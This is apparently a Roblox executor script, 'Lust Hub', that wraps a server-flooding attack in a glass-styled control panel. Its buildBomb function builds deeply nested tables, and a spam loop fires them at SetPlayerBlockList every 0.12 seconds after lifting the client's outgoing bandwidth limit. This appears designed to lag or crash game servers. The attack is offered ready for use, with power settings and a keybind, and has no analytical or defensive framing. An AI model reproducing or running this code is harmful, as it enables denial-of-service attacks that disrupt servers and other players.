local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local CoreGui = game:GetService("CoreGui")
local TweenService = game:GetService("TweenService")
local NetworkClient = game:GetService("NetworkClient")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

-- Cleanup old GUI
local function CleanupOldGUIs()
    local existing = CoreGui:FindFirstChild("Lust Hub")
    if existing then existing:Destroy() end
end
CleanupOldGUIs()

-- Config
local ConfigFile = "LustHubConfig.json"
local Config = { 
    Keybind = "V", 
    PCPower = 97000,
    MobilePower = 72000,
    Mode = "PC",
}

local function SaveConfig()
    if writefile then
        pcall(function() writefile(ConfigFile, HttpService:JSONEncode(Config)) end)
    end
end

local function LoadConfig()
    if isfile and isfile(ConfigFile) then
        local success, data = pcall(function() return HttpService:JSONDecode(readfile(ConfigFile)) end)
        if success and data then
            if type(data.Keybind) == "string" then Config.Keybind = data.Keybind end
            if type(data.PCPower) == "number" then Config.PCPower = math.clamp(data.PCPower, 10000, 150000) end
            if type(data.MobilePower) == "number" then Config.MobilePower = math.clamp(data.MobilePower, 10000, 100000) end
            if type(data.Mode) == "string" and (data.Mode == "PC" or data.Mode == "Mobile") then Config.Mode = data.Mode end
        end
    end
end
LoadConfig()

-- Bomb parameters
local DEPTH = 296

local function buildBomb(power)
    local maintable = {}
    local spammedtable = {}
    table.insert(spammedtable, {})
    local z = spammedtable[1]
    for i = 1, DEPTH do
        local tableins = {}
        table.insert(z, tableins)
        z = tableins
    end
    local maxRep = math.floor(power / (DEPTH + 2))
    for i = 1, maxRep do
        table.insert(maintable, spammedtable)
    end
    return maintable
end

-- Ultra Glass GUI (Silver/Gray Edition)
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "Lust Hub"
ScreenGui.Parent = CoreGui
ScreenGui.ResetOnSpawn = false

local MainFrame = Instance.new("Frame")
MainFrame.Parent = ScreenGui
MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 18)
MainFrame.BackgroundTransparency = 0.08
MainFrame.Position = UDim2.new(0.5, -130, 0.5, -120)
MainFrame.Size = UDim2.new(0, 260, 0, 240)
MainFrame.ClipsDescendants = true
local MainCorner = Instance.new("UICorner", MainFrame)
MainCorner.CornerRadius = UDim.new(0, 20)
local MainStroke = Instance.new("UIStroke", MainFrame)
MainStroke.Color = Color3.fromRGB(180, 180, 190)
MainStroke.Thickness = 0.8
MainStroke.Transparency = 0.3

-- Glass blur effect
local Blur = Instance.new("BlurEffect", MainFrame)
Blur.Size = 8

-- Glow effect (silver)
local GlowFrame = Instance.new("Frame", MainFrame)
GlowFrame.Size = UDim2.new(1, 0, 1, 0)
GlowFrame.BackgroundColor3 = Color3.fromRGB(180, 180, 190)
GlowFrame.BackgroundTransparency = 0.92
GlowFrame.BorderSizePixel = 0
local GlowCorner = Instance.new("UICorner", GlowFrame)
GlowCorner.CornerRadius = UDim.new(0, 20)

-- Header
local Header = Instance.new("Frame")
Header.Parent = MainFrame
Header.BackgroundTransparency = 1
Header.Size = UDim2.new(1, 0, 0, 55)

local Title = Instance.new("TextLabel", Header)
Title.BackgroundTransparency = 1
Title.Position = UDim2.new(0, 15, 0, 0)
Title.Size = UDim2.new(0.5, -15, 1, 0)
Title.Font = Enum.Font.GothamBlack
Title.Text = "Lust Hub"
Title.TextColor3 = Color3.fromRGB(200, 200, 210)
Title.TextSize = 18
Title.TextXAlignment = Enum.TextXAlignment.Left

local Subtitle = Instance.new("TextLabel", Header)
Subtitle.BackgroundTransparency = 1
Subtitle.Position = UDim2.new(0, 15, 0, 28)
Subtitle.Size = UDim2.new(0.5, -15, 0, 15)
Subtitle.Font = Enum.Font.Gotham
Subtitle.Text = "premium bypass"
Subtitle.TextColor3 = Color3.fromRGB(120, 120, 140)
Subtitle.TextSize = 9
Subtitle.TextXAlignment = Enum.TextXAlignment.Left

local ModeSwitchBtn = Instance.new("TextButton", Header)
ModeSwitchBtn.Position = UDim2.new(0.55, 0, 0.5, -14)
ModeSwitchBtn.Size = UDim2.new(0, 85, 0, 28)
ModeSwitchBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
ModeSwitchBtn.BackgroundTransparency = 0.3
ModeSwitchBtn.Font = Enum.Font.GothamBold
ModeSwitchBtn.Text = Config.Mode == "PC" and "PC" or "MOBILE"
ModeSwitchBtn.TextColor3 = Color3.fromRGB(200, 200, 210)
ModeSwitchBtn.TextSize = 12
ModeSwitchBtn.AutoButtonColor = false
local ModeCorner = Instance.new("UICorner", ModeSwitchBtn)
ModeCorner.CornerRadius = UDim.new(0, 20)
local ModeStroke = Instance.new("UIStroke", ModeSwitchBtn)
ModeStroke.Color = Color3.fromRGB(150, 150, 170)
ModeStroke.Thickness = 0.8

-- Scroll container
local ContentFrame = Instance.new("ScrollingFrame")
ContentFrame.Parent = MainFrame
ContentFrame.BackgroundTransparency = 1
ContentFrame.Position = UDim2.new(0, 10, 0, 60)
ContentFrame.Size = UDim2.new(1, -20, 1, -70)
ContentFrame.ScrollBarThickness = 3
ContentFrame.ScrollBarImageColor3 = Color3.fromRGB(150, 150, 170)
ContentFrame.CanvasSize = UDim2.new(0, 0, 0, 0)

local Container = Instance.new("Frame")
Container.Parent = ContentFrame
Container.BackgroundTransparency = 1
Container.Size = UDim2.new(1, 0, 0, 0)

local UIList = Instance.new("UIListLayout", Container)
UIList.SortOrder = Enum.SortOrder.LayoutOrder
UIList.Padding = UDim.new(0, 10)

local function updateCanvas()
    ContentFrame.CanvasSize = UDim2.new(0, 0, 0, Container.AbsoluteSize.Y + 5)
end
UIList:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(updateCanvas)
task.defer(updateCanvas)

-- ===== PC MODE =====
local PCElements = Instance.new("Frame", Container)
PCElements.Size = UDim2.new(1, 0, 0, 0)
PCElements.BackgroundTransparency = 1
PCElements.Visible = Config.Mode == "PC"

local PCUIList = Instance.new("UIListLayout", PCElements)
PCUIList.SortOrder = Enum.SortOrder.LayoutOrder
PCUIList.Padding = UDim.new(0, 8)

-- Toggle Card
local PCCard = Instance.new("Frame", PCElements)
PCCard.Size = UDim2.new(1, 0, 0, 45)
PCCard.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
PCCard.BackgroundTransparency = 0.4
local PCCardCorner = Instance.new("UICorner", PCCard)
PCCardCorner.CornerRadius = UDim.new(0, 14)
local PCCardStroke = Instance.new("UIStroke", PCCard)
PCCardStroke.Color = Color3.fromRGB(100, 100, 120)
PCCardStroke.Thickness = 0.3

local PCToggleBtn = Instance.new("TextButton", PCCard)
PCToggleBtn.Size = UDim2.new(1, -20, 1, -10)
PCToggleBtn.Position = UDim2.new(0, 10, 0, 5)
PCToggleBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
PCToggleBtn.BackgroundTransparency = 0.3
PCToggleBtn.Font = Enum.Font.GothamBold
PCToggleBtn.Text = "DISABLED"
PCToggleBtn.TextColor3 = Color3.fromRGB(150, 150, 170)
PCToggleBtn.TextSize = 13
PCToggleBtn.AutoButtonColor = false
local PCToggleCorner = Instance.new("UICorner", PCToggleBtn)
PCToggleCorner.CornerRadius = UDim.new(0, 10)

-- Keybind Card
local PCKeyCard = Instance.new("Frame", PCElements)
PCKeyCard.Size = UDim2.new(1, 0, 0, 35)
PCKeyCard.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
PCKeyCard.BackgroundTransparency = 0.4
local PCKeyCorner = Instance.new("UICorner", PCKeyCard)
PCKeyCorner.CornerRadius = UDim.new(0, 14)
local PCKeyStroke = Instance.new("UIStroke", PCKeyCard)
PCKeyStroke.Color = Color3.fromRGB(100, 100, 120)
PCKeyStroke.Thickness = 0.3

local PCKeyLabel = Instance.new("TextLabel", PCKeyCard)
PCKeyLabel.Size = UDim2.new(0.5, -10, 1, 0)
PCKeyLabel.Position = UDim2.new(0, 10, 0, 0)
PCKeyLabel.BackgroundTransparency = 1
PCKeyLabel.Font = Enum.Font.Gotham
PCKeyLabel.Text = "Keybind"
PCKeyLabel.TextColor3 = Color3.fromRGB(180, 180, 190)
PCKeyLabel.TextSize = 11
PCKeyLabel.TextXAlignment = Enum.TextXAlignment.Left

local PCKeybindBtn = Instance.new("TextButton", PCKeyCard)
PCKeybindBtn.Position = UDim2.new(0.65, 0, 0.5, -10)
PCKeybindBtn.Size = UDim2.new(0, 60, 0, 20)
PCKeybindBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
PCKeybindBtn.BackgroundTransparency = 0.2
PCKeybindBtn.Font = Enum.Font.GothamBold
PCKeybindBtn.Text = Config.Keybind
PCKeybindBtn.TextColor3 = Color3.fromRGB(200, 200, 210)
PCKeybindBtn.TextSize = 11
local PCKeyCornerBtn = Instance.new("UICorner", PCKeybindBtn)
PCKeyCornerBtn.CornerRadius = UDim.new(0, 8)

-- Power Card
local PCPowerCard = Instance.new("Frame", PCElements)
PCPowerCard.Size = UDim2.new(1, 0, 0, 35)
PCPowerCard.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
PCPowerCard.BackgroundTransparency = 0.4
local PCPowerCorner = Instance.new("UICorner", PCPowerCard)
PCPowerCorner.CornerRadius = UDim.new(0, 14)
local PCPowerStroke = Instance.new("UIStroke", PCPowerCard)
PCPowerStroke.Color = Color3.fromRGB(100, 100, 120)
PCPowerStroke.Thickness = 0.3

local PCPowerLabel = Instance.new("TextLabel", PCPowerCard)
PCPowerLabel.Size = UDim2.new(0.5, -10, 1, 0)
PCPowerLabel.Position = UDim2.new(0, 10, 0, 0)
PCPowerLabel.BackgroundTransparency = 1
PCPowerLabel.Font = Enum.Font.Gotham
PCPowerLabel.Text = "Power"
PCPowerLabel.TextColor3 = Color3.fromRGB(180, 180, 190)
PCPowerLabel.TextSize = 11
PCPowerLabel.TextXAlignment = Enum.TextXAlignment.Left

local PCPowerInput = Instance.new("TextBox", PCPowerCard)
PCPowerInput.Position = UDim2.new(0.65, 0, 0.5, -10)
PCPowerInput.Size = UDim2.new(0, 70, 0, 20)
PCPowerInput.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
PCPowerInput.BackgroundTransparency = 0.2
PCPowerInput.Font = Enum.Font.GothamBold
PCPowerInput.Text = tostring(Config.PCPower)
PCPowerInput.TextColor3 = Color3.fromRGB(200, 200, 210)
PCPowerInput.TextSize = 10
PCPowerInput.ClearTextOnFocus = false
local PCPowerInputCorner = Instance.new("UICorner", PCPowerInput)
PCPowerInputCorner.CornerRadius = UDim.new(0, 8)

-- Footer
local PCFooter = Instance.new("TextLabel", PCElements)
PCFooter.BackgroundTransparency = 1
PCFooter.Size = UDim2.new(1, 0, 0, 20)
PCFooter.Font = Enum.Font.Gotham
PCFooter.Text = "v2 • " .. tostring(Config.PCPower) .. " power"
PCFooter.TextColor3 = Color3.fromRGB(80, 80, 100)
PCFooter.TextSize = 9

-- ===== MOBILE MODE =====
local MobileElements = Instance.new("Frame", Container)
MobileElements.Size = UDim2.new(1, 0, 0, 0)
MobileElements.BackgroundTransparency = 1
MobileElements.Visible = Config.Mode == "Mobile"

local MobileUIList = Instance.new("UIListLayout", MobileElements)
MobileUIList.SortOrder = Enum.SortOrder.LayoutOrder
MobileUIList.Padding = UDim.new(0, 8)

-- Toggle Card
local MobileCard = Instance.new("Frame", MobileElements)
MobileCard.Size = UDim2.new(1, 0, 0, 45)
MobileCard.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
MobileCard.BackgroundTransparency = 0.4
local MobileCardCorner = Instance.new("UICorner", MobileCard)
MobileCardCorner.CornerRadius = UDim.new(0, 14)

local MobileToggleBtn = Instance.new("TextButton", MobileCard)
MobileToggleBtn.Size = UDim2.new(1, -20, 1, -10)
MobileToggleBtn.Position = UDim2.new(0, 10, 0, 5)
MobileToggleBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
MobileToggleBtn.BackgroundTransparency = 0.3
MobileToggleBtn.Font = Enum.Font.GothamBold
MobileToggleBtn.Text = "OFF"
MobileToggleBtn.TextColor3 = Color3.fromRGB(150, 150, 170)
MobileToggleBtn.TextSize = 13
MobileToggleBtn.AutoButtonColor = false
local MobileToggleCorner = Instance.new("UICorner", MobileToggleBtn)
MobileToggleCorner.CornerRadius = UDim.new(0, 10)

-- Power Card
local MobilePowerCard = Instance.new("Frame", MobileElements)
MobilePowerCard.Size = UDim2.new(1, 0, 0, 35)
MobilePowerCard.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
MobilePowerCard.BackgroundTransparency = 0.4
local MobilePowerCorner = Instance.new("UICorner", MobilePowerCard)
MobilePowerCorner.CornerRadius = UDim.new(0, 14)

local MobilePowerLabel = Instance.new("TextLabel", MobilePowerCard)
MobilePowerLabel.Size = UDim2.new(0.5, -10, 1, 0)
MobilePowerLabel.Position = UDim2.new(0, 10, 0, 0)
MobilePowerLabel.BackgroundTransparency = 1
MobilePowerLabel.Font = Enum.Font.Gotham
MobilePowerLabel.Text = "Power"
MobilePowerLabel.TextColor3 = Color3.fromRGB(180, 180, 190)
MobilePowerLabel.TextSize = 11
MobilePowerLabel.TextXAlignment = Enum.TextXAlignment.Left

local MobilePowerInput = Instance.new("TextBox", MobilePowerCard)
MobilePowerInput.Position = UDim2.new(0.65, 0, 0.5, -10)
MobilePowerInput.Size = UDim2.new(0, 70, 0, 20)
MobilePowerInput.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
MobilePowerInput.BackgroundTransparency = 0.2
MobilePowerInput.Font = Enum.Font.GothamBold
MobilePowerInput.Text = tostring(Config.MobilePower)
MobilePowerInput.TextColor3 = Color3.fromRGB(200, 200, 210)
MobilePowerInput.TextSize = 10
MobilePowerInput.ClearTextOnFocus = false
local MobilePowerInputCorner = Instance.new("UICorner", MobilePowerInput)
MobilePowerInputCorner.CornerRadius = UDim.new(0, 8)

-- Footer
local MobileFooter = Instance.new("TextLabel", MobileElements)
MobileFooter.BackgroundTransparency = 1
MobileFooter.Size = UDim2.new(1, 0, 0, 20)
MobileFooter.Font = Enum.Font.Gotham
MobileFooter.Text = "v2 • " .. tostring(Config.MobilePower) .. " power"
MobileFooter.TextColor3 = Color3.fromRGB(80, 80, 100)
MobileFooter.TextSize = 9

-- ===== LOGIC =====
local running = false
local bomb = nil
local spamThread = nil
local currentMode = Config.Mode
local SPAM_DELAY = 0.12

local function getCurrentPower()
    return currentMode == "PC" and Config.PCPower or Config.MobilePower
end

local function restartSpamLoop()
    if running then
        if spamThread then task.cancel(spamThread) end
        local power = getCurrentPower()
        bomb = buildBomb(power)
        spamThread = task.spawn(function()
            while running do
                if bomb then
                    pcall(function()
                        game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(bomb)
                    end)
                end
                task.wait(SPAM_DELAY)
            end
        end)
    end
end

local function updateToggleVisuals(enabled)
    if currentMode == "PC" then
        if enabled then
            PCToggleBtn.Text = "ENABLED"
            PCToggleBtn.TextColor3 = Color3.fromRGB(180, 255, 180)
            PCCardStroke.Color = Color3.fromRGB(180, 180, 190)
            MainStroke.Color = Color3.fromRGB(180, 180, 190)
            MainStroke.Transparency = 0
            ModeStroke.Color = Color3.fromRGB(180, 180, 190)
        else
            PCToggleBtn.Text = "DISABLED"
            PCToggleBtn.TextColor3 = Color3.fromRGB(150, 150, 170)
            PCCardStroke.Color = Color3.fromRGB(100, 100, 120)
            MainStroke.Color = Color3.fromRGB(180, 180, 190)
            MainStroke.Transparency = 0.3
            ModeStroke.Color = Color3.fromRGB(150, 150, 170)
        end
    else
        if enabled then
            MobileToggleBtn.Text = "ON"
            MobileToggleBtn.TextColor3 = Color3.fromRGB(180, 255, 180)
            MainStroke.Color = Color3.fromRGB(180, 180, 190)
            MainStroke.Transparency = 0
            ModeStroke.Color = Color3.fromRGB(180, 180, 190)
        else
            MobileToggleBtn.Text = "OFF"
            MobileToggleBtn.TextColor3 = Color3.fromRGB(150, 150, 170)
            MainStroke.Color = Color3.fromRGB(180, 180, 190)
            MainStroke.Transparency = 0.3
            ModeStroke.Color = Color3.fromRGB(150, 150, 170)
        end
    end
end

local function TogglePCBypass()
    running = not running
    updateToggleVisuals(running)
    if running then
        NetworkClient:SetOutgoingKBPSLimit(math.huge)
        restartSpamLoop()
    else
        if spamThread then task.cancel(spamThread) end
        bomb = nil
        NetworkClient:SetOutgoingKBPSLimit(0)
    end
end

local function ToggleMobileBypass()
    running = not running
    updateToggleVisuals(running)
    if running then
        NetworkClient:SetOutgoingKBPSLimit(math.huge)
        restartSpamLoop()
    else
        if spamThread then task.cancel(spamThread) end
        bomb = nil
        NetworkClient:SetOutgoingKBPSLimit(0)
    end
end

local function SwitchMode()
    if running then
        running = false
        if spamThread then task.cancel(spamThread) end
        bomb = nil
        NetworkClient:SetOutgoingKBPSLimit(0)
        updateToggleVisuals(false)
    end
    
    currentMode = currentMode == "PC" and "Mobile" or "PC"
    Config.Mode = currentMode
    
    PCElements.Visible = currentMode == "PC"
    MobileElements.Visible = currentMode == "Mobile"
    
    if currentMode == "PC" then
        ModeSwitchBtn.Text = "PC"
        PCFooter.Text = "v2 • " .. tostring(Config.PCPower) .. " power"
    else
        ModeSwitchBtn.Text = "MOBILE"
        MobileFooter.Text = "v2 • " .. tostring(Config.MobilePower) .. " power"
    end
    
    SaveConfig()
    updateCanvas()
end

PCToggleBtn.MouseButton1Click:Connect(function()
    if currentMode == "PC" then TogglePCBypass() end
end)
MobileToggleBtn.MouseButton1Click:Connect(function()
    if currentMode == "Mobile" then ToggleMobileBypass() end
end)
ModeSwitchBtn.MouseButton1Click:Connect(SwitchMode)

-- Power inputs
PCPowerInput.FocusLost:Connect(function()
    local numericValue = tonumber(PCPowerInput.Text)
    if numericValue then
        local clampedValue = math.clamp(numericValue, 10000, 150000)
        Config.PCPower = clampedValue
        PCPowerInput.Text = tostring(clampedValue)
    else
        Config.PCPower = 97000
        PCPowerInput.Text = "97000"
    end
    PCFooter.Text = "v2 • " .. tostring(Config.PCPower) .. " power"
    SaveConfig()
    if running and currentMode == "PC" then restartSpamLoop() end
end)

MobilePowerInput.FocusLost:Connect(function()
    local numericValue = tonumber(MobilePowerInput.Text)
    if numericValue then
        local clampedValue = math.clamp(numericValue, 10000, 100000)
        Config.MobilePower = clampedValue
        MobilePowerInput.Text = tostring(clampedValue)
    else
        Config.MobilePower = 72000
        MobilePowerInput.Text = "72000"
    end
    MobileFooter.Text = "v2 • " .. tostring(Config.MobilePower) .. " power"
    SaveConfig()
    if running and currentMode == "Mobile" then restartSpamLoop() end
end)

-- Keybind
local listeningForKey = false
PCKeybindBtn.MouseButton1Click:Connect(function()
    listeningForKey = true
    PCKeybindBtn.Text = "..."
    PCKeybindBtn.TextColor3 = Color3.fromRGB(255, 200, 100)
end)
UserInputService.InputBegan:Connect(function(input, processed)
    if processed then return end
    if listeningForKey then
        if input.UserInputType == Enum.UserInputType.Keyboard then
            Config.Keybind = input.KeyCode.Name
            PCKeybindBtn.Text = Config.Keybind
            PCKeybindBtn.TextColor3 = Color3.fromRGB(200, 200, 210)
            listeningForKey = false
            SaveConfig()
        end
    else
        if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode.Name == Config.Keybind then
            if currentMode == "PC" then TogglePCBypass() end
        end
    end
end)

-- Draggable
local dragging, dragStart, startPos
Header.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = MainFrame.Position
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) and dragging then
        local delta = input.Position - dragStart
        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)
UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then 
        dragging = false 
    end
end)

-- Initialize
PCKeybindBtn.Text = Config.Keybind
PCPowerInput.Text = tostring(Config.PCPower)
MobilePowerInput.Text = tostring(Config.MobilePower)
PCFooter.Text = "v2 • " .. tostring(Config.PCPower) .. " power"
MobileFooter.Text = "v2 • " .. tostring(Config.MobilePower) .. " power"
PCElements.Visible = Config.Mode == "PC"
MobileElements.Visible = Config.Mode == "Mobile"
ModeSwitchBtn.Text = Config.Mode == "PC" and "PC" or "MOBILE"
PCToggleBtn.Text = "DISABLED"
MobileToggleBtn.Text = "OFF"
updateCanvas()
